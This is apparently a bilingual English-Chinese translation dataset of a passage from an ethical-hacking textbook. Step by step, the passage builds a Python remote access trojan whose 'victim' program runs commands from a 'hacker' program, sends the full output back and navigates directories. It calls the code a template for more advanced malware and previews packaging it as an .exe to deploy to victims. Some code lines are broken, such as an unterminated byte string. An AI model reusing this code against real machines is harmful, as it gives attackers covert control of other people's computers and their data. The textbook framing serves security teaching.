  prefs: []
  type: TYPE_NORMAL
  zh: 图6.9 – 截断的命令结果
- en: As you can see, we can only receive 1,024 bytes. This is not what we want. To
    get the complete result, we need to make some modifications. On the victim program,
    we will append a special **identifier** to the end of **command_result**. Using
    this identifier, we will keep reading data in the hacker program until we reach
    the identifier. This will act as a marker for the hacker program to know that
    we have finished receiving all the data and can stop now.
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你所看到的，我们只能接收1,024字节。这不是我们想要的。为了获得完整的结果，我们需要进行一些修改。在受害者程序中，我们将在**command_result**的末尾附加一个特殊的**标识符**。使用这个标识符，我们将在黑客程序中持续读取数据，直到达到标识符。这将作为黑客程序的标记，以便知道我们已经完成接收所有数据并可以停止了。
- en: 'The identifier string will be as follows:'
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 标识符字符串将如下所示：
- en: IDENTIFIER = "<END_OF_COMMAND_RESULT>"
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 标识符 = "<END_OF_COMMAND_RESULT>"
- en: 'To add this identifier to **command_result**, we will first decode the result
    from bytes to string, then append the identifier at the end, and finally again
    convert the string into bytes, as shown:'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 要将这个标识符添加到**command_result**中，我们首先将结果从字节解码为字符串，然后在末尾附加标识符，最后再将字符串转换为字节，如下所示：
- en: command_result = output.stdout
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: command_result = output.stdout
- en: command_result = command_result.decode("utf-8") + IDENTIFIER
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: command_result = command_result.decode("utf-8") + IDENTIFIER
- en: command_result = command_result.encode("utf-8")
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: command_result = command_result.encode("utf-8")
- en: This time, instead of using the **send()** method, we will use the **sendall()**
    method.
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: 这一次，我们将使用**sendall()**方法，而不是**send()**方法。
- en: On the hacker side, we will define the exact same identifier, so we can match
    it. Now, instead of just receiving 1,024 bytes, we will add a **while** loop,
    which will continuously receive data and store it in an array until we find the
    identifier, and then we will remove the identifier and store the rest of the result.
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 在黑客端，我们将定义完全相同的标识符，以便进行匹配。现在，我们不再只接收1,024字节，而是添加一个**while**循环，持续接收数据并将其存储在数组中，直到找到标识符，然后我们将移除标识符并存储剩余的结果。
- en: 'Take a look at the following receiving code:'
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 看一下以下接收代码：
- en: full_command_result = b"
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: full_command_result = b"
- en: 'while True:'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 'while True:'
- en: chunk = hacker_socket.recv(1048)
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: chunk = hacker_socket.recv(1048)
- en: 'if chunk.endswith(IDENTIFIER.encode()):'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 'if chunk.endswith(IDENTIFIER.encode()):'
- en: chunk = chunk[:-len(IDENTIFIER)]
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: chunk = chunk[:-len(IDENTIFIER)]
- en: full_command_result += chunk
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: full_command_result += chunk
- en: break
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: break
- en: full_command_result +=chunk
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: full_command_result +=chunk
- en: print(full_command_result.decode())
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: print(full_command_result.decode())
- en: 'We define a **full_command_result** variable that will hold the complete result.
    Then we write a loop to read the buffer continuously until we reach the identifier.
    Once the identifier is reached, we remove the identifier from the result, add
    the remaining bytes to **full_command_result**, break the loop, and finally decode
    it to print. The complete program for the hacker is shown here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py).'
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 我们定义一个**full_command_result**变量，用于保存完整的结果。然后我们编写一个循环，持续读取缓冲区，直到达到标识符。一旦达到标识符，我们将从结果中移除标识符，将剩余的字节添加到**full_command_result**，跳出循环，最后解码并打印出来。黑客的完整程序如下所示：[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py)。
- en: 'Similarly, the complete program for the victim is shown here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py).'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 同样，受害者的完整程序如下所示：[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py)。
- en: Now we have developed a program for a hacker that will execute commands on the
    Windows victim machine and return a complete result to the hacker. This program
    will work perfectly. However, the command for changing the directory will not
    work properly on this since we are only working with the input and output of the
    command result. Next, we will focus on making a program so that we can even navigate
    directories as well. If you go to your Windows machine and open a Command Prompt,
    you can use the **cd** command to navigate directories, and we will use a similar
    approach here as well. So, when the user enters a change directory command, we
    will move into a different directory in the victim's machine based on the command
    given. In this section, we learned how we can run commands from the hacker program
    and get the results back to the hacker. In the next section, we will learn how
    we can navigate directories on the victim's computer by giving commands from the
    hacker program.
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经开发了一个黑客程序，它将在 Windows 受害者机器上执行命令并将完整的结果返回给黑客。这个程序将完美运行。然而，由于我们只处理命令结果的输入和输出，切换目录的命令将无法正确运行。接下来，我们将专注于开发一个程序，以便我们可以在受害者的机器上进行目录导航。如果你去你的
    Windows 机器并打开命令提示符，你可以使用**cd**命令来导航目录，我们也将在这里使用类似的方法。因此，当用户输入切换目录的命令时，我们将根据给定的命令，在受害者机器上切换到一个不同的目录。在本节中，我们学习了如何从黑客程序运行命令并将结果返回给黑客。在下一节中，我们将学习如何通过黑客程序发送命令来在受害者计算机上进行目录导航。
- en: Navigating directories
  id: totrans-263
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 导航目录
- en: 'We will use a new module to change directory, called the **os** module. This
    module is included in Python''s standard library, so you don''t need to install
    it. Simply import the module in your program by writing the following command:'
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用一个新的模块来更改目录，叫做**os**模块。这个模块包含在 Python 的标准库中，因此你无需安装它。只需通过写入以下命令导入该模块到你的程序中：
- en: import os
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: import os
- en: 'The first thing we need to do is to detect when the user enters the **cd**
    command in the hacker program. This can be done by calling the **startswith()**
    method on the string command. We will detect the command, send the command to
    the victim program, and then skip the rest of the loop as follows:'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先需要做的是检测用户何时在黑客程序中输入**cd**命令。这可以通过对字符串命令调用**startswith()**方法来完成。我们将检测该命令，将命令发送到受害者程序，然后跳过循环中的其余部分，如下所示：
- en: 'if command.startswith("cd"):'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 'if command.startswith("cd"):'
- en: hacker_socket.send(command.encode())
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: hacker_socket.send(command.encode())
- en: continue
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: continue
- en: 'Our first part of the program is now complete. Next, we need to receive this
    command on the victim program, decode it, check the type of command, such as to
    navigate the directory, and then find the path we want to move to. Let''s say
    if we want to move back in the directory (one step up in the hierarchy), we enter
    the following command:'
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的程序第一部分现在已经完成。接下来，我们需要在受害者程序上接收这个命令，解码它，检查命令的类型，比如是否是要切换目录，然后找到我们想要移动到的路径。假设如果我们想在目录中返回上一级（向上一级目录移动），我们输入以下命令：
- en: cd ..
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: cd ..
- en: '**cd** is the name of the command and **..** is the path we want to move to.
    So, on the victim program, we will first use the same check condition to see whether
    **hacker_command** starts with **cd**. If it does, we will strip the command to
    retrieve the path we want to move into. And finally, we will use the **os.chdir()**
    method to navigate to the entered directory if it exists:'
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: '**cd** 是命令的名称，**..** 是我们想要移动到的路径。因此，在受害者程序中，我们首先会使用相同的检查条件来判断**hacker_command**是否以**cd**开头。如果是，我们将去掉命令中的**cd**部分，提取出我们要移动到的路径。最后，如果路径存在，我们将使用**os.chdir()**方法切换到输入的目录：'
- en: 'if hacker_command.startswith("cd"):'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 'if hacker_command.startswith("cd"):'
- en: path2move = hacker_command.strip("cd ")
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: path2move = hacker_command.strip("cd ")
- en: 'if os.path.exists(path2move):'
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 'if os.path.exists(path2move):'
- en: os.chdir(path2move)
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: os.chdir(path2move)
- en: 'else:'
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 'else:'
- en: print("can't change directory to ", path2move)
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: print("无法切换到目录 ", path2move)
- en: continue
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: continue
- en: 'In Windows, you can see the current directory by giving the **pwd** (present
    working directory) command in the shell. Let''s now run the hacker and victim
    programs to see how we can navigate directories:'
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Windows 中，你可以通过在命令行中输入**pwd**（当前工作目录）命令来查看当前目录。现在，让我们运行黑客和受害者程序，看看我们如何导航目录：
- en: '![Figure 6.10 – Changing directory'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.10 – 更改目录'
- en: '](image/B14788_06_10.jpg)'
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_06_10.jpg)'
- en: Figure 6.10 – Changing directory
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.10 – 更改目录
- en: 'As you can see in the preceding screenshot, we first navigate up in the folder
    by using the **cd ..** command and move to the **user** folder. Then, we navigate
    to the Desktop folder by means of the **cd Desktop** command. This way, we can
    move up or down in the filesystem. The complete code for the hacker program is
    given here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py).'
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: 正如您在上面的截图中所看到的，我们首先通过使用**cd ..**命令在文件夹中向上导航，然后移动到**user**文件夹。然后，我们通过**cd Desktop**命令导航到桌面文件夹。通过这种方式，我们可以在文件系统中上下移动。黑客程序的完整代码在这里：[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py)。
- en: 'Similarly, the complete code for the victim program is shown here: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py).'
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: 同样，受害者程序的完整代码在这里显示：[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py)。
- en: This preceding program will allow the hacker to execute commands and give basic
    control of the victim's PC to the hacker. The hacker can use this as a template
    to build more advanced functionalities into the program. You may be thinking that
    whatever code we have written so far is in the form of a Python script, and in
    order to deploy it and make a successful hacking attempt, the victim PC must have
    Python installed and the script should be run manually, which does not seem like
    a very good idea. Do not worry. In [*Chapter 8*](B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160),
    *Post Exploitation*, we will look at how we can bundle our Python code into a
    single executable file with all the dependencies included inside it. This way,
    we do not have to worry about whether the victim has Python installed. We will
    create an **.exe** file from our script and deploy it to the victim. More about
    this in the next chapter.
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 这个程序将允许黑客执行命令并基本控制受害者的计算机。黑客可以将其用作模板，将更高级的功能集成到程序中。您可能会认为我们迄今为止编写的所有代码都是以Python脚本的形式存在的，为了部署它并进行成功的黑客攻击，受害者的计算机必须安装Python，并且必须手动运行脚本，这似乎不是一个很好的主意。不用担心。在[*第8章*](B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160)，*后渗透*中，我们将看看如何将我们的Python代码打包成一个包含所有依赖项的单个可执行文件。这样，我们就不必担心受害者是否安装了Python。我们将从我们的脚本创建一个**.exe**文件，并将其部署到受害者那里。更多内容请参见下一章。
- en: Summary
  id: totrans-287
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we began by learning about socket programming and then learned
    about how we can use sockets to create a network application. Our network application
    included a hacker and victim program, which helped us to send Windows system commands
    from a Linux-based hacker program, execute them on Windows, and get the results
    back to the hacker. We also learned how to navigate the file stream as well. Our
    basic version of the RAT is complete. Even though it is limited in its functionalities,
    it gives us a solid understanding of the basics to create a far more advanced
    malware program. In the next chapter, we will add some more features to our RAT,
    such as transferring files. See you in the next chapter!
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们首先学习了套接字编程，然后学习了如何使用套接字创建网络应用程序。我们的网络应用程序包括一个黑客程序和一个受害者程序，这帮助我们从基于Linux的黑客程序向Windows系统发送命令，执行这些命令，并将结果返回给黑客。我们还学习了如何操作文件流。我们的基本远控程序已经完成。尽管功能有限，但它为我们提供了创建更高级恶意软件程序的基础理解。在下一章中，我们将为我们的远控程序添加一些更多功能，比如文件传输。下一章见！
